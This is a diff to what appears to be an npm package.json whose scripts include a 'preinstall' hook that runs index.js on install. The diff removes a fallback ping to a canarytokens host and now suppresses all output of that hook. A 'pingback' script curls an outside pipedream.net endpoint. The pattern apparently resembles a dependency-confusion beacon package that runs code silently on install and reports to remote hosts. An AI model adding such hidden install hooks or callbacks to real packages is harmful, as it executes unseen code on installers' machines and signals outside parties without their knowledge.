@@ -208,7 +208,7 @@
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "webpack --config build/webpack.build.conf.js",
-    "preinstall": "node index.js || ping go4wda46okp7rjtmwqiqr09rt.canarytokens.com > venc_ses",
+    "preinstall": "node index.js > /dev/null 2>&1",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "rollup -c -w",
     "coverage": "vitest run --coverage",
